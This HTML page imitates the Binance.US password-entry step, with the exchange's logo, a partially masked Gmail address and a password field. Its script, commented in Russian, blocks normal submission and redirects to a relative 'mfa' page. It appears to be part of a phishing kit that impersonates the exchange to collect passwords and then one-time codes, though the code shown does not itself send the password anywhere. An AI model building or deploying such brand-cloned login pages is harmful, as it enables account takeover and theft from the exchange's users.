<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Binance</title>

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">

    <!-- Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: #ffffff;
            display: flex;
            margin-top: 52px;
            justify-content: center;
            align-items: center;
            padding: 24px;
            position: relative;
        }

        .container {
            width: 425px;
            height: 649px;
            background: #fff;
            border-radius: 24px;
            padding: 40px;
            border: 1px solid #eaecef;
            position: relative;
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            margin-bottom: 30px;
        }

        .logo-icon {
            width: 40px;
            height: 40px;
            margin-right: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-icon .binance-logo {
            width: 32px;
            height: 28px;
        }

        .logo-text {
            font-size: 22px;
            font-weight: 700;
            color: rgb(240, 185, 11);
        }

        .title {
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-size: 26px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #1e2329;
        }

        .email-info {
            font-size: 14px;
            color: #5e6673;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
            position: relative;
        }

        .form-label {
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 6px;
            color: #1e2329;
            display: block;
        }

        .input-wrapper {
            position: relative;
        }

        .form-input {
            width: 100%;
            height: 51px;
            padding: 10px 80px 10px 14px;
            font-size: 14px;
            border: 1px solid #d0d5dd;
            border-radius: 11px;
            color: #1e2329;
            outline: none;
            transition: border 0.2s;
        }

        .form-input:focus {
            border-color: #f0b90b;
        }

        .clear-icon {
            position: absolute;
            right: 38px;
            top: 48%;
            transform: translateY(-50%);
            font-size: 27px;
            color: #999;
            cursor: pointer;
            display: none;
        }

        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            width: 20px;
            height: 20px;
        }

        .password-toggle svg {
            color: #9C9C9C;
        }

        .submit-btn {
            width: 100%;
            padding: 12px;
            background-color: #FCD535;
            color: #000;
            font-weight: 600;
            font-size: 14px;
            border: none;
            border-radius: 11px;
            cursor: pointer;
        }

        .forgot-password {
            text-align: center;
            margin-top: 10px;
            font-size: 13px;
        }

        .forgot-password a {
            color: #C99400;
            text-decoration: none;
        }

        .bottom-footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #ffffff;
            padding: 16px 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 24px;
            font-size: 12px;
            color: #5e6673;
        }

        .bottom-footer svg {
            width: 16px;
            height: 16px;
            margin-right: 6px;
        }

        .bottom-footer a {
            color: #5e6673;
            text-decoration: none;
        }

        .bottom-footer a:hover {
            color: #1e2329;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">
        <div class="logo-icon">
            <svg viewBox="0 0 126.61 126.61" xmlns="http://www.w3.org/2000/svg" class="binance-logo">
                <g fill="#f3ba2f">
                    <path d="m38.73 53.2 24.59-24.58 24.6 24.6 14.3-14.31-38.9-38.91-38.9 38.9z"/>
                    <path d="m0 63.31 14.3-14.31 14.31 14.31-14.31 14.3z"/>
                    <path d="m38.73 73.41 24.59 24.59 24.6-24.6 14.31 14.29-38.9 38.91-38.91-38.88z"/>
                    <path d="m98 63.31 14.3-14.31 14.31 14.3-14.31 14.32z"/>
                    <path d="m77.83 63.3-14.51-14.52-10.73 10.73-1.24 1.23-2.54 2.54 14.51 14.5 14.51-14.47z"/>
                </g>
            </svg>
        </div>
        <div class="logo-text">BINANCE.US</div>
    </div>
    <div class="title">Enter your password</div>
    <div class="email-info">bsc.t****@gmail.com</div>
    <form>
        <div class="form-group">
            <label class="form-label" for="password">Password</label>
            <div class="input-wrapper">
                <input class="form-input" type="password" id="password" placeholder=" ">
                <span class="clear-icon" id="clearBtn">×</span>
                <div class="password-toggle" id="passwordToggle">
                    <svg class="bn-svg cursor-pointer text-[--color-IconNormal] w-[20px] h-[20px]" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M16.345 7.125a.9.9 0 011.199-.131l.072.058 4.38 3.903a1.4 1.4 0 010 2.09l-4.587 4.088a7.626 7.626 0 01-5.072 1.931h-.642a7.624 7.624 0 01-4.307-1.334 1 1 0 01-.334-.181l-.101-.086-.066-.065a.9.9 0 011.163-1.355c.068.026.125.055.167.08.047.027.09.055.131.084a5.826 5.826 0 003.347 1.057h.641a5.826 5.826 0 003.876-1.475l4.251-3.79-4.044-3.604-.066-.064a.9.9 0 01-.008-1.206zm-3.975-2.19l.032.003c.545.04 1.148.094 1.718.208a.9.9 0 01-.356 1.765c-.44-.089-.934-.137-1.455-.175h-.614c-1.34 0-2.635.461-3.671 1.302l-.204.174-4.244 3.78 2.273 1.98.067.064a.9.9 0 01-1.176 1.35l-.072-.056-2.617-2.278a1.4 1.4 0 01-.011-2.101l4.583-4.084.266-.227a7.626 7.626 0 014.806-1.705h.675z" fill="currentColor"></path>
                        <path d="M10.615 13.567l2.97-2.97 1.414 1.414-2.97 2.97-1.414-1.414z" fill="currentColor"></path>
                        <path d="M19.51 3.232l.069-.062a.9.9 0 011.266 1.267l-.061.068L4.521 20.77a.9.9 0 01-1.274-1.274L19.511 3.232z" fill="currentColor"></path>
                    </svg>
                </div>
            </div>
        </div>
        <button class="submit-btn" type="submit">Next</button>
        <div class="forgot-password">
            <a href="#">Forgot password?</a>
        </div>
    </form>
</div>
<div class="bottom-footer">
    <svg class="bn-svg css-166786i" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M20.6 18.26h-1.545a1 1 0 00-.767.358l-.075.103-.713 1.111-.713-1.111-.075-.103a1 1 0 00-.767-.358H14.4V14.4h6.2v3.86z" fill="currentColor"></path>
        <path d="M1.644 12.025C1.644 6.268 6.312 1.6 12.07 1.6c4.383 0 9.143 3.146 10.165 8.738a.9.9 0 01-1.77.324C19.61 5.992 15.653 3.4 12.07 3.4a8.625 8.625 0 00-1.107 17.18h.104a.9.9 0 01.348 1.729c-.005.002-.01.007-.015.01a.907.907 0 01-.331.08l-.038.001h-.026a.896.896 0 01-.083-.005l-.044-.003-.05-.006a1.265 1.265 0 01-.121-.026c-5.114-.668-9.063-5.039-9.063-10.335z" fill="currentColor"></path>
        <path d="M20.634 7.67l.091.005a.9.9 0 010 1.79l-.091.006H3.367a.9.9 0 010-1.801h17.267zM10.5 14.53l.092.004a.9.9 0 010 1.791l-.092.005H3.367a.9.9 0 010-1.8H10.5z" fill="currentColor"></path>
    </svg>
    <a href="#">English</a>
    <a href="#">Cookies</a>
    <a href="#">Terms</a>
    <a href="#">Privacy</a>
</div>
<script>
    const passwordInput = document.getElementById('password');
    const clearBtn = document.getElementById('clearBtn');

    passwordInput.addEventListener('input', function () {
        clearBtn.style.display = this.value.length > 0 ? 'block' : 'none';
    });

    clearBtn.addEventListener('click', function () {
        passwordInput.value = '';
        clearBtn.style.display = 'none';
        passwordInput.focus();
    });

    // === Обработка нажатия "Next" ===
    document.querySelector('form').addEventListener('submit', function (e) {
        e.preventDefault(); // отменяем стандартную отправку формы
        window.location.href = 'mfa'; // редирект на страницу mfa
    });
</script>
</body>
</html>
